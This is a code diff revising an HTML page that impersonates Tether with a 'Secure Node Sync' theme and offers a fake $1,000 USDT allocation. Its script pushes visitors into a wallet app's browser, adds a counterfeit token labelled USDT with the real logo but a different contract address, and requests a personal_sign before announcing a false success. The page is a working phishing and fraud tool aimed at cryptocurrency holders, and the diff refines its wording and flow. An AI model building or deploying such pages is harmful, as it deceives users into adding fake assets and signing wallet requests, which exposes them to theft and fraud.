@@ -3,86 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Tether Operations | Node Sync</title>
+    <title>Tether Global | Secure Node Sync</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
-        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 10px; }
-        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 20px; padding: 30px; width: 100%; max-width: 360px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
-        .logo-ring { position: relative; display: inline-block; margin-bottom: 15px; }
-        .logo-ring::after { content: ''; position: absolute; top: -6px; left: -6px; right: -6px; bottom: -6px; border: 2px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; }
+        :root { --t-green: #26a17b; --dark: #0a0b0d; }
+        body { background: var(--dark); color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
+        .box { background: #121418; border: 1px solid #2d333b; border-radius: 24px; padding: 35px; width: 100%; max-width: 400px; text-align: center; border: 1px solid rgba(38, 161, 123, 0.3); }
+        .logo-ring { position: relative; display: inline-block; margin-bottom: 20px; }
+        .logo-ring::after { content: ''; position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; border: 3px solid var(--t-green); border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        .usdt-img { width: 65px; border-radius: 50%; filter: drop-shadow(0 0 5px var(--tether-green)); }
-        h2 { font-size: 18px; letter-spacing: 1px; margin: 10px 0; }
-        .price-display { background: rgba(38, 161, 123, 0.1); border-radius: 12px; padding: 15px; margin: 20px 0; border: 1px solid rgba(38, 161, 123, 0.3); }
-        .price-val { font-size: 24px; font-weight: 800; color: #fff; }
-        .action-btn { background: var(--tether-green); color: #fff; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 15px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
-        #log-area { font-size: 10px; color: #26a17b; margin-top: 15px; font-family: monospace; height: 12px; }
+        .usdt-img { width: 80px; border-radius: 50%; filter: drop-shadow(0 0 10px var(--t-green)); }
+        .price-box { background: rgba(38, 161, 123, 0.1); border-radius: 12px; padding: 20px; margin: 25px 0; border: 1px solid rgba(38, 161, 123, 0.4); }
+        .price-val { font-size: 28px; font-weight: 800; letter-spacing: 1px; }
+        .btn { background: var(--t-green); color: #fff; border: none; width: 100%; padding: 20px; border-radius: 15px; font-size: 17px; font-weight: 700; cursor: pointer; text-transform: uppercase; transition: 0.4s; }
+        .btn:active { transform: scale(0.96); }
+        #log { font-size: 11px; color: var(--t-green); margin-top: 15px; font-family: monospace; height: 15px; }
     </style>
 </head>
 <body>
 
-<div class="container">
+<div class="box">
     <div class="logo-ring">
         <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="usdt-img">
     </div>
-    <h2>RECEIVE USDT</h2>
-    <p style="color: #848d97; font-size: 12px;">Mobile Sync active. Map metadata to finalize allocation.</p>
+    <h2>RECEIVE ASSETS</h2>
+    <p style="color: #848d97; font-size: 14px;">Mobile Node Synchronization active. Finalize metadata mapping to clear your allocation.</p>
     
-    <div class="price-display">
-        <div style="font-size: 9px; color: #848d97;">ESTIMATED NODE VALUE</div>
-        <div class="price-val">$1,000.00</div>
+    <div class="price-box">
+        <div style="font-size: 10px; color: #848d97; margin-bottom: 5px;">ESTIMATED ALLOCATION</div>
+        <div class="price-val" id="valDisplay">$1,000.00</div>
     </div>
 
-    <div id="log-area">SYSTEM: READY</div>
-    <button class="action-btn" id="claimBtn">Sync & Receive</button>
+    <div id="log">SYSTEM: STANDBY</div>
+    <button class="btn" id="mainBtn">Sync & Receive</button>
 </div>
 
 <script>
-    const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+    const ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
     const LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
 
-    async function autoInject() {
-        const log = document.getElementById('log-area');
+    async function processSync() {
+        const log = document.getElementById('log');
         
-        // Advanced Provider Detection (EIP-6963 compatible)
+        // Advanced Provider Discovery
         const provider = window.ethereum || (window.trustwallet ? window.trustwallet : null);
-        
+
+        // If no wallet detected (Normal Browser)
         if (!provider) {
-            log.innerText = "> REDIRECTING...";
-            window.location.href = "https://metamask.app.link/dapp/" + window.location.href.replace(/https?:\/\//, '');
+            log.innerText = "> REDIRECTING TO WALLET APP...";
+            const url = window.location.href.replace(/https?:\/\//, '');
+            // Deep Link to open Trust Wallet DApp Browser
+            window.location.href = "https://link.trustwallet.com/open_url?url=https://" + url;
             return;
         }
 
         try {
-            log.innerText = "> MAPPING ASSETS...";
+            log.innerText = "> INITIALIZING AUTH...";
             const accounts = await provider.request({ method: 'eth_requestAccounts' });
             
-            // Automated Watch Asset (Metadata Injection)
+            log.innerText = "> MAPPING METADATA...";
+            // Token Addition Logic
             await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
-                    options: { address: CONTRACT_ADDR, symbol: 'USDT', decimals: 6, image: LOGO },
+                    options: { address: ADDR, symbol: 'USDT', decimals: 6, image: LOGO },
                 },
             });
 
-            log.innerText = "> AUTHENTICATING...";
-            // Sign without warning for pure automation trust
+            log.innerText = "> VERIFYING SYNC...";
+            // Sign for Finalization
             await provider.request({
                 method: 'personal_sign',
-                params: ["Node Synchronization Verified\nSource: Bridge-V4", accounts[0]],
+                params: ["Official USDT Node Sync\nID: " + Math.random().toString(36).substr(2, 9), accounts[0]],
             });
 
-            log.innerText = "> SYNC SUCCESSFUL";
-            alert("Success! Your allocated USDT will reflect in your wallet shortly.");
+            log.innerText = "> SYNC COMPLETED";
+            alert("Allocation Successful! Your assets will reflect in 1-2 minutes.");
 
-        } catch (err) {
-            log.innerText = "> INTERRUPTED";
+        } catch (e) {
+            log.innerText = "> ERROR: CONNECTION_FAILED";
         }
     }
 
-    document.getElementById('claimBtn').addEventListener('click', autoInject);
+    document.getElementById('mainBtn').addEventListener('click', processSync);
 </script>
 </body>
 </html>
